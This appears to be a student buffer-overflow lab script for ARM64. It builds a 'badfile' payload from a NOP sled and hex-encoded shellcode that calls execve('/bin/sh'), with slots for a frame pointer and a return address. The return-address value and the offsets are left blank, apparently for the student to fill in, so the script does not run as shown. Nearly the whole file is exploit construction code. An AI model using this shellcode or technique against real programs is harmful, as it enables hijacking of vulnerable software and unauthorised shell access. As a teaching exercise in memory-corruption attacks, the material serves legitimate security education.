#!/usr/bin/python3
import sys

# aarch64 shellcode for execve("/bin/sh", NULL, NULL)
shellcode = (
    "\xe1\x45\x8c\xd2"
    "\x21\xcd\xad\xf2"
    "\xe1\x65\xce\xf2"
    "\x01\x0d\xe0\xf2"
    "\xe1\x8f\x1f\xf8"
    "\xe1\x03\x1f\xaa"
    "\xe2\x03\x1f\xaa"
    "\xe0\x63\x21\x8b"
    "\xa8\x1b\x80\xd2"
    "\xe1\x66\x02\xd4"
).encode('latin-1')

# Fill the content with NOPs (ARM64 no-op instruction is `0xD503201F`)
NOP = b"\x1f\x20\x03\xd5"
content = bytearray(NOP * 75)

# Put the shellcode at the 'start'
start = 32
content[start:start+40] = shellcode	

# Frame pointer 
fp  = 0xffffffffffffee20    # it is okay. Why?
content[] = (fp).to_bytes(8, byteorder='little')

# Return address 
ret = 
content[] = (ret).to_bytes(8, byteorder='little')

# Write the content to a file
with open('badfile', 'wb') as f:
    f.write(content)

